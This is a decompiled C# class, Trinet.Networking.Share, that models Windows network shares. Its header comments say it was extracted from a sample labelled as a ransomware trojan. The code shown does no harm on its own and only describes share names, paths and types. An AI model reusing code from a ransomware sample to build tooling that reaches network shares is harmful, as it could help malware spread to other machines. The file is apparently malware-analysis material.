// Decompiled with JetBrains decompiler
// Type: Trinet.Networking.Share
// Assembly: xaqipaxowq, Version=2.7.3.1, Culture=neutral, PublicKeyToken=null
// MVID: 717542D9-9F58-42E9-9315-5411271D63FD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.Win32.Generic-1d16285d88d42a50c89fddfc9f1449b38b3f8e0e680f4b1b57bf88a4143a2812.exe

using System;
using System.IO;

namespace Trinet.Networking
{
  public class Share
  {
    private string _server;
    private string _netName;
    private string _path;
    private ShareType _shareType;
    private string _remark;

    public Share(string server, string netName, string path, ShareType shareType, string remark)
    {
      if (ShareType.Special == shareType && "IPC$" == netName)
        shareType |= ShareType.IPC;
      this._server = server;
      this._netName = netName;
      this._path = path;
      this._shareType = shareType;
      this._remark = remark;
    }

    public string Server => this._server;

    public string NetName => this._netName;

    public string Path => this._path;

    public ShareType ShareType => this._shareType;

    public string Remark => this._remark;

    public bool IsFileSystem => (this._shareType & ShareType.Device) == ShareType.Disk && (this._shareType & ShareType.IPC) == ShareType.Disk && (this._shareType & ShareType.Printer) == ShareType.Disk && ((this._shareType & ShareType.Special) == ShareType.Disk || ShareType.Special == this._shareType && this._netName != null && this._netName.Length != 0);

    public DirectoryInfo Root
    {
      get
      {
        if (!this.IsFileSystem)
          return (DirectoryInfo) null;
        if (this._server != null && this._server.Length != 0)
          return new DirectoryInfo(this.ToString());
        return this._path == null || this._path.Length == 0 ? new DirectoryInfo(this.ToString()) : new DirectoryInfo(this._path);
      }
    }

    public override string ToString() => this._server == null || this._server.Length == 0 ? string.Format("\\\\{0}\\{1}", (object) Environment.MachineName, (object) this._netName) : string.Format("\\\\{0}\\{1}", (object) this._server, (object) this._netName);

    public bool MatchesPath(string path)
    {
      if (!this.IsFileSystem)
        return false;
      switch (path)
      {
        case "":
        case null:
          return true;
        default:
          return path.ToLower().StartsWith(this._path.ToLower());
      }
    }
  }
}
